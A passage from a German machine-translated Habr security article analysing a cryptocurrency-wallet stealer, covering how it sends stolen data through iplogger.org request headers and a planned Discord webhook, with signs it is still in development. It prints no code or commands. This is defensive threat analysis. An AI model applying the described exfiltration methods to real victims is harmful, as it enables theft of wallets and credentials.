User-Agent-HTTP-Header hinzu, wie unten gezeigt. <br><br><img src="https://habrastorage.org/webt/fz/xc/us/fzxcusdwmjnv8irew2lhlnlg7ss.png"><br>  <i>Abbildung 4. IP Logger-Konsole mit Ausgabe.</i> <br><br>  Die Betreiber haben iplogger.org nicht zum Exfiltrieren von Brieftaschen verwendet.  Wahrscheinlich haben sie aufgrund der Beschr√§nkung von 255 Zeichen im Feld <code>User-Agent</code> , das in der IP Logger-Weboberfl√§che angezeigt wird, auf eine andere Methode zur√ºckgegriffen.  In den untersuchten Beispielen wurde ein anderer Server zur Ausgabe von Daten in der Umgebungsvariablen <code>DiscordWebHook</code> gespeichert.  √úberraschenderweise wird diese Umgebungsvariable an keiner Stelle im Code zugewiesen.  Dies deutet darauf hin, dass sich die Malware noch in der Entwicklung befindet und die Variable auf dem Testcomputer des Bedieners zugewiesen ist. <br><br>  Es gibt ein weiteres Zeichen daf√ºr, dass sich das Programm in der Entwicklung befindet.  Die Bin√§rdatei enth√§lt zwei iplogger.org-URLs, und beim Exfiltrieren der Daten wird eine Anforderung an beide gesendet.  Bei einer Anforderung an eine dieser URLs steht vor dem Wert im Feld Referer "DEV /".  Wir haben auch eine Version gefunden, die nicht mit ConfuserEx gepackt wurde. Der Empf√§nger f√ºr diese URL hei√üt DevFeedbackUrl.  Basierend auf dem Namen der Umgebungsvariablen glauben wir, dass Betreiber planen, den legitimen Discord-Dienst und sein Web-Interception-System zu verwenden, um Kryptow√§hrungs-Wallets zu stehlen. <br><br><h2>  Fazit </h2><br>  Diese Kampagne ist ein Beispiel f√ºr die Verwendung legitimer Werbedienste bei Cyber-Angriffen.  Das Programm richtet sich an russische Organisationen, aber wir werden nicht √ºberrascht sein, wenn ein solcher Angriff nichtrussische Dienste nutzt.  Um Kompromisse zu vermeiden, m√ºssen Benutzer auf den Ruf der Quelle der heruntergeladenen Software vertrauen k√∂nnen. <br><br>  Eine vollst√§ndige Liste der MITRE ATT &amp; CK-Indikatoren f√ºr Kompromisse und Attribute finden Sie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hier</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de450126/">https://habr.com/ru/post/de450126/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de450116/index.html">Betriebssysteme: Drei einfache Teile. Teil 5: Planung: Mehrstufige Feedback-Warteschlange (√úbersetzung)</a></li>
<li><a href="../de450118/index.html">Streamen Sie den Bildschirm √ºber das Netzwerk auf mehrere Ger√§te</a></li>
<li><a href="../de450120/index.html">Suchen Sie nach √§hnlichen Bildern und analysieren Sie einen einzelnen Algorithmus</a></li>
<li><a href="../de450122/index.html">Startup Digest: Genetics (Januar - M√§rz 2019)</a></li>
<li><a href="../de450124/index.html">Konfigurieren von OsmAnd-Karten der Strava-Heatmap-Ebene</a></li>
<li><a href="../de450128/index.html">Verwendung der Minolta AF-Optik (Sony A-Mount) bei modernen spiegellosen Kameras von Sony</a></li>
<li><a href="../de450130/index.html">√úberleben Teams nach dem Hackathon?</a></li>
<li><a href="../de450132/index.html">Monade kann nicht erkl√§rt werden</a></li>
<li><a href="../de450134/index.html">Das zweite Leben von Ringen und Broschen: Wie man Schmuck mithilfe der 3D-Technologie schnell nachbaut</a></li>
<li><a href="../de450136/index.html">Wenn die W√§nde nicht genug sind. So sch√ºtzen Sie Endpunkte</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>